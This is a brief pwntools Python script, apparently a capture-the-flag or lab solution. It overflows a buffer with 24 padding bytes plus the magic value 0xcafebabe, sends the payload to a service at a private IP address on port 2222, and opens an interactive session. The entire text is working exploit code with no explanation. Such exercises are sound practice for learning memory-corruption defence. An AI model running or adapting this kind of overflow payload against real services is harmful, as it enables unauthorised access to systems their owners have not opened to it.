from pwn import *
offset = b"A" * 24
secret= b"\xbe\xba\xfe\xca"
payload = offset + secret
io = remote('192.168.178.115', 2222)
print(io.recvline())
print(io.recvline())
io.sendline(payload)
io.interactive()
